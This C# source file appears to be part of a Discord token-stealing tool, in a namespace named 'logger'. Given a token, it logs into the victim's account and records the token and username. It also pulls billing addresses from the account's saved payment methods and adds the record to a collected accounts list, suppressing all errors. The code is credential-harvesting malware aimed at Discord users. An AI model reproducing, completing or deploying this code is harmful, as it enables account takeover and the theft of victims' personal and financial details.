using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Text;
using Discord;
namespace logger
{
    class DiscordAPI
    {

        public static List<string> accountssused = new List<string>();

        public static void main(string token)
        {
            
            try
            {
                DiscordClient client = new DiscordClient(token, new DiscordConfig() { RetryOnRateLimit = true });


                
                

                if (accountssused.Contains(client.User.Id.ToString()))
                {
             
                    return;
                }
                else
                {
                    accountssused.Add(client.User.Id.ToString());
                  
                    StringBuilder account = new StringBuilder();
                    account.Append("token: ||" + token + "|| \nUsename: " + client.User.Username);
                    var payments = client.GetPaymentMethods();

                    if(payments.Count > 0) {
                        account.Append("\nPayments Details: ");
                        foreach(var pay in payments)
                        {
                            account.Append("\nBilling: " + pay.BillingAddress.Address1 + ", " + pay.BillingAddress.City + ", " + pay.BillingAddress.Country);
                        }
                    }
                    Utils.Accounts.Add(account.ToString());
                    

                }
               
            } catch
            {
            }
            

            

        }


        static void client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            
        }

        static void client_OnMessageReceived(DiscordSocketClient client, MessageEventArgs args)
        {
           
           
        }



    }
}
